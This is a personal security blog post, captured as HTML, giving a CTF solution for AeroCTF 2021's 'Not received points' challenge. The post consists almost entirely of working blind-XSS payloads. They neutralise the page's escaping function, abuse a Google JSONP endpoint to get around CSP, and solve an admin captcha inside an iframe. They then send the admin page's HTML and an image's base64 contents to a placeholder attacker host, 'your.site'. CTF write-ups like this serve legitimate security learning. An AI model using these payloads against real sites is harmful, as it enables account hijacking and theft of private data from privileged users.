@@ -1,0 +1,330 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        AeroCTF 2021&#39;s Not received points solution ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="AeroCTF 2021&amp;rsquo;s Not received points solution."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/aeroctf-2021-not-received-points/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="AeroCTF 2021&#39;s Not received points solution"/>
+<meta name="twitter:description" content="AeroCTF 2021’s Not received points solution."/>
+
+
+
+<meta property="og:title" content="AeroCTF 2021&#39;s Not received points solution"/>
+<meta property="og:description" content="AeroCTF 2021’s Not received points solution."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/aeroctf-2021-not-received-points/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2021-02-27T00:00:00+00:00"/>
+<meta property="article:modified_time" content="2021-02-27T00:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">AeroCTF 2021’s Not received points solution</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-02-27
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/aeroctf/">#AeroCTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/xss/">#XSS</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Solving a simple captcha and retrieving an image contents through a blind XSS @AeroCTF’s “Not received (points|prize)” w/ @ripp3rsCTF</p>
+<p>Context: <a href="https://twitter.com/jorge_ctf/status/1365962187836186626" target="_blank">tweet</a></p>
+<h3 id="void-_escape">Void _.escape</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// this made empty the client-side func that escaped our input
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">_</span>.<span style="color:#a6e22e">escape</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">s</span>) {<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">s</span>}
+</code></pre></div><h3 id="leak-flag-image-uri">Leak flag image uri</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// XSS through JSONP from accounts.google.com
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">scr</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">ipt</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://accounts.google.com/o/oauth2/revoke?callback=(function(){
+</span><span style="color:#e6db74">  var frame=document.createElement(&#39;iframe&#39;);
+</span><span style="color:#e6db74">  frame.src=&#39;/admin/prize.html&#39;;
+</span><span style="color:#e6db74">  frame.onload = function () {
+</span><span style="color:#e6db74">    setTimeout(function() {
+</span><span style="color:#e6db74">      // window.open(&#39;http://your.site/leak?leak=&#39;%2BencodeURIComponent(frame.contentDocument.body.innerHTML));
+</span><span style="color:#e6db74">      problem = frame.contentDocument.querySelector(&#39;span[id=ex]&#39;).textContent;
+</span><span style="color:#e6db74">      problem_parts = problem.split(&#39; &#39;);
+</span><span style="color:#e6db74">      uno = problem_parts[0];
+</span><span style="color:#e6db74">      dos = problem_parts[2];
+</span><span style="color:#e6db74">      caso = problem_parts[1];
+</span><span style="color:#e6db74">      // couldn&#39;t eval because of CSP
+</span><span style="color:#e6db74">      if (caso == &#39;/&#39;) {
+</span><span style="color:#e6db74">         sol = uno / dos;
+</span><span style="color:#e6db74">      };
+</span><span style="color:#e6db74">      if (caso == &#39;*&#39;) {
+</span><span style="color:#e6db74">         sol = uno * dos;
+</span><span style="color:#e6db74">      };
+</span><span style="color:#e6db74">      // solve captcha inside iframe
+</span><span style="color:#e6db74">      frame.contentDocument.querySelector(&#39;input&#39;).value = sol;
+</span><span style="color:#e6db74">      frame.contentDocument.querySelector(&#39;button&#39;).click();
+</span><span style="color:#e6db74">      // window.open(&#39;http://your.site/leak?leak=&#39;%2BencodeURIComponent(problem%2Bcaso%2Bsol%2Bproblem_parts));
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">      setTimeout(function() {
+</span><span style="color:#e6db74">        // leak HTML once captcha is solved
+</span><span style="color:#e6db74">        window.open(&#39;http://your.site/leak?leak=&#39;%2BencodeURIComponent(frame.contentDocument.body.innerHTML));
+</span><span style="color:#e6db74">      }, 500);
+</span><span style="color:#e6db74">    }, 500);
+</span><span style="color:#e6db74">  };
+</span><span style="color:#e6db74">  document.body.appendChild(frame);
+</span><span style="color:#e6db74">})();&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/scr&lt;script&gt;ipt&gt;</span>
+</code></pre></div><h3 id="leak-image-contents">Leak image contents</h3>
+<p><a href="https://stackoverflow.com/questions/12950465/how-to-get-image-bytes-string-base64-in-html5-jquery-javascript" target="_blank">https://stackoverflow.com/questions/12950465/how-to-get-image-bytes-string-base64-in-html5-jquery-javascript</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// fail image: /admin/img/bf3adc3899a7b88bbedbe51271472a15.png
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">im</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">g</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin/img/175193053491407376ff47dc6e834673.png&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;myimage&#34;</span> <span style="color:#f92672">/&gt;</span>
+<span style="color:#75715e">// 2000x2000 wasn&#39;t needed but we wanted to make sure it was enough
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">can</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">vas</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2000&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2000&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mycanvas&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/can&lt;img&gt;vas&gt;</span>
+
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">scr</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">ipt</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://accounts.google.com/o/oauth2/revoke?callback=(function(){
+</span><span style="color:#e6db74">  var myImage = document.getElementById(&#39;myimage&#39;);
+</span><span style="color:#e6db74">  var myCanvas = document.getElementById(&#39;mycanvas&#39;);
+</span><span style="color:#e6db74">  var ctx = myCanvas.getContext(&#39;2d&#39;);
+</span><span style="color:#e6db74">  ctx.drawImage(myImage, 0, 0);
+</span><span style="color:#e6db74">  var text = myCanvas.toDataURL(&#39;image/png&#39;);
+</span><span style="color:#e6db74">  i=0;
+</span><span style="color:#e6db74">  // @danielcues magic
+</span><span style="color:#e6db74">  while(-Math.sign(i%2b500-text.length)){
+</span><span style="color:#e6db74">    if (text.substring(i,i%2b500)==&#39;&#39;) {
+</span><span style="color:#e6db74">      break;
+</span><span style="color:#e6db74">    }
+</span><span style="color:#e6db74">    window.open(&#39;http://your.site/&#39;%2bi%2b&#39;?w=&#39;%2BencodeURIComponent(text.substring(i,i%2b500)));
+</span><span style="color:#e6db74">    i = i %2B 500;
+</span><span style="color:#e6db74">      
+</span><span style="color:#e6db74">    // Trying to de-asynchronize window.open
+</span><span style="color:#e6db74">    a = 0;
+</span><span style="color:#e6db74">    while(a!=90000000){a%2B%2B;}
+</span><span style="color:#e6db74">  }
+</span><span style="color:#e6db74">  // leak the left bytes
+</span><span style="color:#e6db74">  window.open(&#39;http://your.site/&#39;%2bi%2b&#39;?w=&#39;%2BencodeURIComponent(text.substring(i,text.length)));
+</span><span style="color:#e6db74">})();&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/scr&lt;script&gt;ipt&gt;</span>
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/cyberedu-web-challenges/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">CyberEDU&#39;s Web challenges&#39; writeups</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/cybexctf-2021-walow3b/">
+                  <span class="button__text">CybexCTF 2021&#39;s WaloW3b solver.</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
